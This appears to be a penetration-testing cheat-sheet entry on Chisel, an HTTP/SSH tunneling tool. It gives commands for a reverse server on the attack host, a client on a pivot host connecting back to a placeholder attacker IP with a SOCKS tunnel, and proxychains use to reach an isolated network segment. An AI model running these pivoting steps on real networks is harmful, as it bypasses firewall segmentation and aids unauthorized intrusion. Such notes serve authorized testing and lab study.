- Chisel is a TCP/UDP based-tunneling tool written in Go. 
- It uses HTTP to transport data which is secured by SSH. 
- Chisel can create a client-server tunnel connection in a firewall restricted environment





### Syntax

1. Setting up the chisel server in reverse mode on the attack host

```bash
./chisel server --port 9999 --reverse
```


2. Connecting to the chisel server from the pivot host and creating a SOCKS tunnel

```bash
./chisel client <attackerIP>:9999 R:socks
```


3. Configuring proxychains and using it to tunnel any command through the SOCKS proxy

```bash
proxychains <any_command>
```



Now, we can reach the isolated network segment which was previously inaccessible from our attackbox, by tunneling all traffic through the pivot host.
